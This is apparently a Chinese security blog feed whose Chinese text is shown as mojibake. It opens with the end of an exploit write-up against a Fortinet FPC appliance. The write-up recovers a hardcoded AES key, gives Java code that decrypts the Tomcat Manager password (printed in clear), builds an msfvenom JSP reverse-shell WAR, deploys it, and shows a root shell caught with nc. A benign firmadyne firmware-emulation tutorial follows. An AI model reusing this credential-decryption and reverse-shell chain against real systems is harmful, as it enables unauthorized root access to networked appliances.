&amp;&amp; (output.contains(<span class="string">&quot;OK&quot;</span>)) &amp;&amp; (output.contains(<span class="string">&quot;fpc&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">failedMessage</span> <span class="operator">=</span> <span class="string">&quot;reload context &#x27;fpc&#x27; failed. details in log. restart Tomcat server to make SAML update in effect.&quot;</span>;</span><br><span class="line"></span><br><span class="line">        log.error(failedMessage, ex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>Tomcat é‡æ–°åŠ è½½æ—¶ï¼Œä¼šä½¿ç”¨ curl å‘½ä»¤è°ƒç”¨ Tomcat Manager çš„ reload æ¥å£ï¼Œå…¶ä¸­ä½¿ç”¨äº† fpcadmin çš„å¯†ç ã€‚</p>
<p>å…ˆä½¿ç”¨ decryptString å‡½æ•°å¯¹å…¶è§£å¯†ï¼Œè§£å¯†å‡½æ•°å…³é”®ä»£ç </p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES/CBC/PKCS5PADDING&quot;</span>);</span><br><span class="line"><span class="type">SecretKeySpec</span> <span class="variable">secretKey</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(key, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line"><span class="type">byte</span>[] iv = <span class="keyword">new</span> <span class="title class_">byte</span>[cipher.getBlockSize()];</span><br><span class="line">pSpec = <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(iv);</span><br><span class="line">cipher.init(<span class="number">2</span>, secretKey, pSpec);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">decryptedString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(cipher.doFinal(Base64.decodeBase64(stringToDecrypt)));</span><br><span class="line">log.debug(<span class="string">&quot;decrypt string&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> decryptedString;</span><br></pre></td></tr></table></figure></div>

<p>decryptString ä½¿ç”¨ AES ç®—æ³•å¯¹å¯†ç è¿›è¡Œè§£å¯†ï¼Œkey è¢«å®šä¹‰ä¸ºæˆå‘˜å˜é‡</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] key = &#123; Byte.MAX_VALUE, <span class="number">34</span>, -<span class="number">24</span>, -<span class="number">72</span>, -<span class="number">95</span>, <span class="number">31</span>, -<span class="number">10</span>, -<span class="number">7</span>, <span class="number">74</span>, <span class="number">78</span>, -<span class="number">74</span>, -<span class="number">26</span>, -<span class="number">63</span>, -<span class="number">48</span>, -<span class="number">7</span>, -<span class="number">10</span> &#125;;</span><br></pre></td></tr></table></figure></div>

<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç¼–å†™ä»£ç å¯¹å…¶ä¸­çš„å¯†ç è¿›è¡Œè§£å¯†</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.crypto.BadPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.IllegalBlockSizeException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.NoSuchPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.security.spec.AlgorithmParameterSpec;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">dec</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] key = &#123; Byte.MAX_VALUE, <span class="number">34</span>, -<span class="number">24</span>, -<span class="number">72</span>, -<span class="number">95</span>, <span class="number">31</span>, -<span class="number">10</span>, -<span class="number">7</span>, <span class="number">74</span>, <span class="number">78</span>, -<span class="number">74</span>, -<span class="number">26</span>, -<span class="number">63</span>, -<span class="number">48</span>, -<span class="number">7</span>, -<span class="number">10</span> &#125;;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">AlgorithmParameterSpec</span> <span class="variable">pSpec</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES/CBC/PKCS5PADDING&quot;</span>);</span><br><span class="line">        <span class="type">SecretKeySpec</span> <span class="variable">secretKey</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(key, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] iv = <span class="keyword">new</span> <span class="title class_">byte</span>[cipher.getBlockSize()];</span><br><span class="line">        pSpec = <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(iv);</span><br><span class="line">        cipher.init(<span class="number">2</span>, secretKey, pSpec);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">decryptedString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(cipher.doFinal(Base64.getDecoder().decode(<span class="string">&quot;y542PfTSFP9E2mZ6SfBaIK4Y8OIEV3HyiBDBUjSQXB4=&quot;</span>)));</span><br><span class="line">        System.out.println(decryptedString);    <span class="comment">// fortinet@FPC#12345</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æœ€ç»ˆå¾—åˆ°æ˜æ–‡å¯†ç ï¼šfortinet@FPC#12345</p>
<p>ç”¨è´¦å· fpcadmin:fortinet@FPC#12345 å³å¯ç™»å½• Tomcat Managerï¼Œå¹¶ä¸”è®¿é—®åå°æ¥å£ã€‚</p>
<h3 id="è·å–-shell"><a href="#è·å–-shell" class="headerlink" title="è·å– shell"></a>è·å– shell</h3><p>å¾—åˆ°åå°æƒé™åå¯ä»¥è¿›ä¸€æ­¥è·å– root shellï¼Œæˆ‘ä»¬ä½¿ç”¨å·¥å…· <a class="link"   href="https://github.com/tomcatmanager/tomcatmanager" >tomcatmanager<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ï¼Œå…ˆä¿®æ”¹ tomcat_manager.py ç¬¬ 535 è¡Œ requests.put ä»£ç ï¼Œæ·»åŠ å‚æ•° verify&#x3D;False é˜²æ­¢ python SSL è¯ä¹¦æŠ¥é”™ã€‚</p>
<p>é¦–å…ˆç”¨ msf ç”Ÿæˆ war æœ¨é©¬</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.160  LPORT=13337 -f war &gt; shell.war</span><br></pre></td></tr></table></figure></div>

<p>tomcat-manager é“¾æ¥åˆ°ç›®æ ‡ï¼Œå¯†ç ï¼šfortinet@FPC#12345</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tomcat-manager&gt; connect https://192.168.0.200/manager fpcadmin --noverify</span><br><span class="line">Password: </span><br><span class="line">--connected to https://192.168.0.200/manager as fpcadmin</span><br><span class="line">--tomcat version: [Apache Tomcat/9.0.44]</span><br></pre></td></tr></table></figure></div>

<p>åˆ©ç”¨ deploy æ¥å£éƒ¨ç½²æœ¨é©¬</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tomcat-manager&gt; deploy local ./shell.war /rce</span><br></pre></td></tr></table></figure></div>

<p>éƒ¨ç½²åå¯é€šè¿‡ list å‘½ä»¤æŸ¥çœ‹æ˜¯å¦éƒ¨ç½²æˆåŠŸ</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tomcat-manager&gt; list</span><br><span class="line">Path                     State   Sessions Directory                           </span><br><span class="line">------------------------ ------- -------- ------------------------------------</span><br><span class="line">/                        running        2 ROOT                                </span><br><span class="line">/fpc                     running        1 fpc                                 </span><br><span class="line">/manager                 running        0 manager                             </span><br><span class="line">/rce                     running        0 rce  </span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬çœ‹åˆ°åˆ—è¡¨ä¸­å‡ºç°äº†åˆšåˆšéƒ¨ç½²çš„æœ¨é©¬ï¼Œå¯¹åº”è·¯ç”±ä¸º &#x2F;rce</p>
<p>åœ¨æ”»å‡»ç«¯ç›‘å¬ç«¯å£ 13337ï¼Œç„¶åè®¿é—® &#x2F;rce æ¥å£ï¼Œå³å¯è·å–åˆ° root shell</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">âœ  Desktop nc -lnvp 13337                    </span><br><span class="line">Listening on 0.0.0.0 13337</span><br><span class="line">Connection received on 192.168.0.200 46194</span><br><span class="line">uname -a</span><br><span class="line">Linux FPCVM64 2.6.36.3 #1 SMP Wed May 19 10:33:07 PDT 2021 x86_64 GNU/Linux</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>å›ºä»¶æ¨¡æ‹Ÿ Case Study (3)</title>
    <url>/2021/08/15/firmadyne3/</url>
    <content><![CDATA[<p>æ¨¡æ‹Ÿ DIR-815 å›ºä»¶ã€‚</p>
<span id="more"></span>

<h1 id="æ”¹é€ -firmadyne"><a href="#æ”¹é€ -firmadyne" class="headerlink" title="æ”¹é€  firmadyne"></a>æ”¹é€  firmadyne</h1><h2 id="å–æ¶ˆæ•°æ®åº“ä¾èµ–"><a href="#å–æ¶ˆæ•°æ®åº“ä¾èµ–" class="headerlink" title="å–æ¶ˆæ•°æ®åº“ä¾èµ–"></a>å–æ¶ˆæ•°æ®åº“ä¾èµ–</h2><p>firmadyne é»˜è®¤ä¼šåˆ›å»ºå¹¶ä½¿ç”¨æ•°æ®åº“ï¼Œç”¨äºè®°å½•å’Œç»Ÿè®¡å›ºä»¶ä¿¡æ¯ï¼Œç„¶è€Œæˆ‘ä»¬åœ¨æ¨¡æ‹Ÿå›ºä»¶çš„è¿‡ç¨‹ä¸­é€šå¸¸æ— éœ€è¿™ä¸€åŠŸèƒ½ï¼Œæ‰€ä»¥å¯ä»¥ä¿®æ”¹å…¶ä»£ç å–æ¶ˆæ•°æ®åº“ä¾èµ–ã€‚</p>
<p>ä¿®æ”¹ firmadyne&#x2F;scripts&#x2F;getArch.shï¼Œåˆ é™¤æ“ä½œæ•°æ®åº“çš„ä»£ç </p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">æ³¨é‡Šæ‰ä¸‹é¢è¿™å¥</span><br><span class="line"><span class="comment"># psql -d firmware -U firmadyne -h 127.0.0.1 -q -c &quot;UPDATE image SET arch = &#x27;$ARCHEND&#x27; WHERE id = $IID;&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>ä¿®æ”¹ firmadyne&#x2F;scripts&#x2F;makeImage.sh</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ³¨æ„</span><br><span class="line">åŸè„šæœ¬ä¸­ä»¥ä¸‹è¿™æ®µä»£ç </span><br><span class="line">TARBALL_SIZE=$(tar ztvf &quot;$&#123;TARBALL_DIR&#125;/$&#123;IID&#125;.tar.gz&quot; --totals 2&gt;&amp;1 |tail -1|cut -f4 -d&#x27; &#x27;)</span><br><span class="line">å¦‚æœä½ ä½¿ç”¨çš„ tar ä¼šè¾“å‡ºä¸­æ–‡ä¿¡æ¯ï¼Œé‚£ä¹ˆé»˜è®¤ cut -f4 è·å–åˆ°çš„ IMAGE_SIZE å°†æ˜¯é”™è¯¯çš„ï¼Œéœ€è¦ä¿®æ”¹ä¸º</span><br><span class="line">TARBALL_SIZE=$(tar ztvf &quot;$&#123;TARBALL_DIR&#125;/$&#123;IID&#125;.tar.gz&quot; --totals 2&gt;&amp;1 |tail -1|cut -f2 -d&#x27; &#x27;)</span><br><span class="line">æ ¹æ®å®é™…æƒ…å†µè¿›è¡Œä¿®æ”¹</span><br></pre></td></tr></table></figure></div>



<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"><span class="built_in">set</span> -u</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -e ./firmadyne.config ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">source</span> ./firmadyne.config</span><br><span class="line"><span class="keyword">elif</span> [ -e ../firmadyne.config ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">source</span> ../firmadyne.config</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Error: Could not find &#x27;firmadyne.config&#x27;!&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> check_number <span class="variable">$1</span>; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage: makeImage.sh &lt;image ID&gt; [&lt;architecture]&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">IID=<span class="variable">$&#123;1&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> check_root; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Error: This script requires root privileges!&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -eq 1 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Error: No arch selected!&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> check_arch <span class="string">&quot;<span class="variable">$&#123;2&#125;</span>&quot;</span>; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Error: Invalid architecture!&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">ARCH=<span class="variable">$&#123;2&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Running----&quot;</span></span><br><span class="line">WORK_DIR=`get_scratch <span class="variable">$&#123;IID&#125;</span>`    <span class="comment"># no need to change</span></span><br><span class="line">IMAGE=`get_fs <span class="variable">$&#123;IID&#125;</span>`            <span class="comment"># no need to change</span></span><br><span class="line">IMAGE_DIR=`get_fs_mount <span class="variable">$&#123;IID&#125;</span>`  <span class="comment"># no need to change</span></span><br><span class="line">CONSOLE=`get_console <span class="variable">$&#123;ARCH&#125;</span>`</span><br><span class="line">LIBNVRAM=`get_nvram <span class="variable">$&#123;ARCH&#125;</span>`</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Creating working directory <span class="variable">$&#123;WORK_DIR&#125;</span>----&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="variable">$&#123;WORK_DIR&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">chmod</span> a+rwx <span class="string">&quot;<span class="variable">$&#123;WORK_DIR&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">chown</span> -R <span class="string">&quot;<span class="variable">$&#123;USER&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;WORK_DIR&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">chgrp</span> -R <span class="string">&quot;<span class="variable">$&#123;USER&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;WORK_DIR&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -e <span class="string">&quot;<span class="variable">$&#123;TARBALL_DIR&#125;</span>/<span class="variable">$&#123;IID&#125;</span>.tar.gz&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Error: Cannot find tarball of root filesystem for <span class="variable">$&#123;IID&#125;</span>!&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TARBALL_SIZE=$(tar ztvf <span class="string">&quot;<span class="variable">$&#123;TARBALL_DIR&#125;</span>/<span class="variable">$&#123;IID&#125;</span>.tar.gz&quot;</span> --totals 2&gt;&amp;1 |<span class="built_in">tail</span> -1|<span class="built_in">cut</span> -f2 -d<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">MINIMUM_IMAGE_SIZE=$((TARBALL_SIZE + <span class="number">10</span> * <span class="number">1024</span> * <span class="number">1024</span>))</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----The size of root filesystem &#x27;<span class="variable">$&#123;TARBALL_DIR&#125;</span>/<span class="variable">$&#123;IID&#125;</span>.tar.gz&#x27; is <span class="variable">$TARBALL_SIZE</span>-----&quot;</span></span><br><span class="line">IMAGE_SIZE=8388608</span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$IMAGE_SIZE</span> -le <span class="variable">$MINIMUM_IMAGE_SIZE</span> ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    IMAGE_SIZE=$((IMAGE_SIZE*<span class="number">2</span>))</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Creating QEMU Image <span class="variable">$&#123;IMAGE&#125;</span> with size <span class="variable">$&#123;IMAGE_SIZE&#125;</span>----&quot;</span></span><br><span class="line">qemu-img create -f raw <span class="string">&quot;<span class="variable">$&#123;IMAGE&#125;</span>&quot;</span> <span class="variable">$IMAGE_SIZE</span></span><br><span class="line"><span class="built_in">chmod</span> a+rw <span class="string">&quot;<span class="variable">$&#123;IMAGE&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Creating Partition Table----&quot;</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;o\nn\np\n1\n\n\nw&quot;</span> | /sbin/fdisk <span class="string">&quot;<span class="variable">$&#123;IMAGE&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Mounting QEMU Image----&quot;</span></span><br><span class="line">DEVICE=$(get_device <span class="string">&quot;<span class="subst">$(kpartx -a -s -v <span class="string">&quot;<span class="variable">$&#123;IMAGE&#125;</span>&quot;</span>)</span>&quot;</span>)</span><br><span class="line"><span class="built_in">sleep</span> 1</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Device mapper created at <span class="variable">$&#123;DEVICE&#125;</span>----&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Creating Filesystem----&quot;</span></span><br><span class="line">mkfs.ext2 <span class="string">&quot;<span class="variable">$&#123;DEVICE&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">sync</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Making QEMU Image Mountpoint at <span class="variable">$&#123;IMAGE_DIR&#125;</span>----&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ ! -e <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">mkdir</span> <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">chown</span> <span class="string">&quot;<span class="variable">$&#123;USER&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Mounting QEMU Image Partition 1----&quot;</span></span><br><span class="line">mount <span class="string">&quot;<span class="variable">$&#123;DEVICE&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Extracting Filesystem Tarball to Mountpoint----&quot;</span></span><br><span class="line">tar -xf <span class="string">&quot;<span class="variable">$&#123;TARBALL_DIR&#125;</span>/<span class="variable">$&#123;IID&#125;</span>.tar.gz&quot;</span> -C <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Creating FIRMADYNE Directories----&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>/firmadyne/&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>/firmadyne/libnvram/&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>/firmadyne/libnvram.override/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Patching Filesystem (chroot)----&quot;</span></span><br><span class="line"><span class="built_in">cp</span> $(<span class="built_in">which</span> busybox) <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">cp</span> <span class="string">&quot;<span class="variable">$&#123;SCRIPT_DIR&#125;</span>/fixImage.sh&quot;</span> <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">chroot</span> <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>&quot;</span> /busybox ash /fixImage.sh</span><br><span class="line"><span class="built_in">rm</span> <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>/fixImage.sh&quot;</span></span><br><span class="line"><span class="built_in">rm</span> <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>/busybox&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Setting up FIRMADYNE----&quot;</span></span><br><span class="line"><span class="built_in">cp</span> <span class="string">&quot;<span class="variable">$&#123;CONSOLE&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>/firmadyne/console&quot;</span></span><br><span class="line"><span class="built_in">chmod</span> a+x <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>/firmadyne/console&quot;</span></span><br><span class="line"><span class="built_in">mknod</span> -m 666 <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>/firmadyne/ttyS1&quot;</span> c 4 65</span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> <span class="string">&quot;<span class="variable">$&#123;LIBNVRAM&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>/firmadyne/libnvram.so&quot;</span></span><br><span class="line"><span class="built_in">chmod</span> a+x <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>/firmadyne/libnvram.so&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> <span class="string">&quot;<span class="variable">$&#123;SCRIPT_DIR&#125;</span>/preInit.sh&quot;</span> <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>/firmadyne/preInit.sh&quot;</span></span><br><span class="line"><span class="built_in">chmod</span> a+x <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>/firmadyne/preInit.sh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Unmounting QEMU Image----&quot;</span></span><br><span class="line"><span class="built_in">sync</span></span><br><span class="line">umount <span class="string">&quot;<span class="variable">$&#123;DEVICE&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Deleting device mapper----&quot;</span></span><br><span class="line">kpartx -d <span class="string">&quot;<span class="variable">$&#123;IMAGE&#125;</span>&quot;</span></span><br><span class="line">losetup -d <span class="string">&quot;<span class="variable">$&#123;DEVICE&#125;</span>&quot;</span> &amp;&gt;/dev/null</span><br><span class="line">dmsetup remove $(<span class="built_in">basename</span> <span class="string">&quot;<span class="variable">$DEVICE</span>&quot;</span>) &amp;&gt;/dev/null</span><br></pre></td></tr></table></figure></div>

<h2 id="ä¿®æ”¹-inferNetwork-sh"><a href="#ä¿®æ”¹-inferNetwork-sh" class="headerlink" title="ä¿®æ”¹ inferNetwork.sh"></a>ä¿®æ”¹ inferNetwork.sh</h2><div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"><span class="built_in">set</span> -u</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -e ./firmadyne.config ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">source</span> ./firmadyne.config</span><br><span class="line"><span class="keyword">elif</span> [ -e ../firmadyne.config ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">source</span> ../firmadyne.config</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Error: Could not find &#x27;firmadyne.config&#x27;!&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> check_number <span class="variable">$1</span>; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage: inferNetwork.sh &lt;image ID&gt; [&lt;architecture&gt;]&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">IID=<span class="variable">$&#123;1&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -eq 1 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Error: No arch selected!&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> check_arch <span class="string">&quot;<span class="variable">$&#123;2&#125;</span>&quot;</span>; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Error: Invalid architecture!&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">ARCH=<span class="variable">$&#123;2&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Running firmware <span class="variable">$&#123;IID&#125;</span>: terminating after 60 secs...&quot;</span></span><br><span class="line"><span class="built_in">timeout</span> --preserve-status --signal SIGINT 60 <span class="string">&quot;<span class="variable">$&#123;SCRIPT_DIR&#125;</span>/run.<span class="variable">$&#123;ARCH&#125;</span>.sh&quot;</span> <span class="string">&quot;<span class="variable">$&#123;IID&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">sleep</span> 1</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Inferring network...&quot;</span></span><br><span class="line"><span class="string">&quot;<span class="variable">$&#123;SCRIPT_DIR&#125;</span>/makeNetwork.py&quot;</span> -i <span class="string">&quot;<span class="variable">$&#123;IID&#125;</span>&quot;</span> -q -o -a <span class="string">&quot;<span class="variable">$&#123;ARCH&#125;</span>&quot;</span> -S <span class="string">&quot;<span class="variable">$&#123;SCRATCH_DIR&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Done!&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h1 id="æ¨¡æ‹Ÿå›ºä»¶"><a href="#æ¨¡æ‹Ÿå›ºä»¶" class="headerlink" title="æ¨¡æ‹Ÿå›ºä»¶"></a>æ¨¡æ‹Ÿå›ºä»¶</h1><p>æŒ‰ç…§ firmadyne å®˜æ–¹ç»™å‡ºçš„æ­¥éª¤ï¼Œå…ˆå°è¯•å¯¹å›ºä»¶è¿›è¡Œæ¨¡æ‹Ÿã€‚</p>
